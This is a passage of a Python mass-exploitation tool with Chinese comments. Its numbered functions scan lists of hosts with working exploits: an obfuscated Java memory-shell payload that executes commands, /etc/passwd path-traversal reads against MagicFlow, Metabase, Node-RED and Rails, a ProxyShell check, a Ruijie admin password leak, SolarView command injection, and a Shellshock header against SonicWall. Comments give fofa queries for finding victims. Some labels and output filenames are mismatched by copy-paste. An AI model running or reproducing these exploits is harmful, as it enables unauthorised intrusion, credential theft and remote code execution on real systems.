0020\u003d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u005b\u0069\u005d\u003b\u0069\u0066\u0020\u0028\u0074\u0020\u003d\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u0074\u0072\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u004e\u0061\u006d\u0065\u0028\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0065\u0078\u0065\u0063\u0022\u0029\u0020\u007c\u007c\u0020\u0021\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0068\u0074\u0074\u0070\u0022\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0061\u0072\u0067\u0065\u0074\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0074\u0029\u003b\u0069\u0066\u0020\u0028\u0021\u0028\u006f\u0062\u006a\u0020\u0069\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u006f\u0066\u0020\u0052\u0075\u006e\u006e\u0061\u0062\u006c\u0065\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0069\u0073\u0024\u0030\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0020\u003d\u0020\u0028\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0029\u0020\u0028\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u006a\u0020\u003d\u0020\u0030\u003b\u0020\u006a\u0020\u003c\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0073\u0069\u007a\u0065\u0028\u0029\u003b\u0020\u002b\u002b\u006a\u0029\u0020\u007b\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0067\u0065\u0074\u0028\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0072\u0065\u0071\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0071\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0073\u0070\u0020\u003d\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u0030\u005d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u0030\u005d\u0029\u003b\u0073\u0074\u0072\u0020\u003d\u0020\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u0029\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0048\u0065\u0061\u0064\u0065\u0072\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0022\u0043\u006d\u0064\u0022\u007d\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0021\u0073\u0074\u0072\u002e\u0069\u0073\u0045\u006d\u0070\u0074\u0079\u0028\u0029\u0029\u0020\u007b\u0020\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0053\u0074\u0061\u0074\u0075\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0032\u0030\u0030\u0029\u007d\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u0020\u0063\u006d\u0064\u0073\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0022\u002c\u0020\u0022\u002f\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u0020\u003a\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u0022\u002c\u0020\u0022\u002d\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u0022\u0047\u0042\u004b\u0022\u003a\u0022\u0055\u0054\u0046\u002d\u0038\u0022\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0074\u0065\u0078\u0074\u0032\u0020\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u0053\u0063\u0061\u006e\u006e\u0065\u0072\u0028\u0028\u006e\u0065\u0077\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u0029\u002e\u0075\u0073\u0065\u0044\u0065\u006c\u0069\u006d\u0069\u0074\u0065\u0072\u0028\u0022\u005c\u005c\u0041\u0022\u0029\u002e\u006e\u0065\u0078\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0072\u0065\u0073\u0075\u006c\u0074\u003d\u0028\u0022\u0045\u0078\u0065\u0063\u0075\u0074\u0065\u003a\u0020\u0020\u0020\u0020\u0022\u002b\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0074\u0065\u0078\u0074\u0032\u002c\u0022\u0075\u0074\u0066\u002d\u0038\u0022\u0029\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0074\u006f\u006d\u0063\u0061\u0074\u002e\u0075\u0074\u0069\u006c\u002e\u0062\u0075\u0066\u002e\u0042\u0079\u0074\u0065\u0043\u0068\u0075\u006e\u006b\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u003b\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006f\u0062\u006a\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0030\u0029\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u004d\u0065\u0074\u0068\u006f\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0076\u0061\u0072\u0035\u0029\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0061\u0076\u0061\u002e\u006e\u0069\u006f\u002e\u0042\u0079\u0074\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0077\u0072\u0061\u0070\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0063\u006c\u0073\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0074\u0072\u0075\u0065\u003b\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0020\u007d"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, verify=False,headers=headers,data=data,timeout=3)
            if "groups=" in res.text:
                with open ("存在蓝凌OA treexml.tmpl 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                            print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                            f.write(url + "\n")
                            f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 27、MagicFlow 防火墙网关 main.xp 任意文件读取漏洞一把梭
def magicflow_readfile_exp(dic):
    poc = r"""/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "root" in res.text:
                with open ("存在MagicFlow 防火墙网关 main.xp 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 28、MetaBase任意文件读取漏洞(CVE-2021-41277)一把梭 fofa:app="Metabase"
def metabase_readfile_exp(dic):
    poc = r"""/api/geojson?url=file:/etc/passwd"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "root" in res.text:
                with open ("存在MetaBase任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 29、Microsoft Exchange RCE(cve-2021-34473)一把梭 fofa:app="Microsoft-Exchange"
def Microsoft_proxyshell_cve_2021_34473_exp(dic):
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list
        else:
            url = 'http://'+ url_list
        newurl = url.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            testurl = f"https://{host}/autodiscover/autodiscover.json?@mss.com/owa/?&Email=autodiscover/autodiscover.json%3F@mss.com"
            try:
                req = requests.get(testurl, timeout=10, verify=False, allow_redirects=False)
                if (req.status_code == 302) and (re.search("errorfe.aspx", req.text)):
                    with open ("存在Microsoft Exchange RCE漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
                else:
                    print("[-]---------下一个更精彩：" + url)
            except Exception as err:
                print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 30、Node-RED ui_base 任意文件读取漏洞一把梭 fofa:title="Node-RED"
def node_red_anyfile_read_exp(dic):
    poc = r"""/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "root" in res.text:
                with open ("存在Node-RED ui_base 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 31、Rails Accept 任意文件读取漏洞(CVE-2019-5418)一把梭 fofa:title="Ruby On Rails"
def Rails_anyfile_read_cve_2019_5418_exp(dic):
    headers = {
        "Accept": "../../../../../../../../etc/passwd{{"
    }
    poc = r"""/robots"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url,headers=headers,verify=False,timeout=3)
            if "root" in res.text and "No route matches" not in res.text:
                with open ("存在Rails Accept 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 32、锐捷 EG易网关 login.php 管理员账号密码泄露漏洞一把梭 fofa:app="Ruijie-EG易网关" && port="4430"
def ruijie_admin_passwd_leak_exp(dic):
    data = {'username': 'admin',
            'password': 'pass?show webmaster user'}
    poc = ":4430/login.php"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url,data=data, verify=False, timeout=3)
            if "data" in res.text and "Unrecognized host or address." not in res.text:
                with open ("存在Rails Accept 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 33、锐捷EG易网关 phpinfo.view.php 信息泄露漏洞一把梭 fofa:app="Ruijie-EG易网关"
def ruijie_phpinfo_leak_exp(dic):
    poc = r"""/tool/view/phpinfo.view.php"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "PHP License" in res.text:
                with open ("存在锐捷EG易网关 phpinfo.view.php 信息泄露漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 34、Sapido 多款路由器 远程命令执行漏洞一把梭 fofa:app="Sapido-路由器"
def Sapido_RCE_exp(dic):
    poc = r"""/syscmd.htm"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url,verify=False,timeout=3)
            if "System Command" in res.text:
                with open ("存在Sapido 多款路由器 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 35、SolarView远程命令执行漏洞(CVE-2022-29303)一把梭 fofa:body="SolarView Compact" && title=="Top"
def SolarView_rce_CVE_2022_29303_exp(dic):
    poc = r"""/conf_mail.php"""
    data = "mail_address=%3Bcat%20/etc/passwd%3B&button=%83%81%81%5B%83%8B%91%97%90M"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, data=data,verify=False,timeout=3)
            print(res.text)
            if "root" in res.text:
                with open ("存在SolarView远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 36、SonicWall SSL-VPN 远程命令执行漏洞一把梭 fofa:(body="login_box_sonicwall" || header="SonicWALL SSL-VPN Web Server") && body="SSL-VPN"
def sonicwall_ssl_vpn_verify(dic):
    poc = '/cgi-bin/jarrewrite.sh'
    header = {'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'}
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            r = requests.get(url, headers=header, verify=False, timeout=10)
            if r.status_code == 200 and 'root:' in r.text:
                with open ("存在SonicWall SSL-VPN 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 37、用友 U8 OA test.jsp SQL注入漏洞一把梭
def sophos_firewall_rce_cve_2022_1040_exp(dic):
    poc = r"""/webconsole/Controller"""
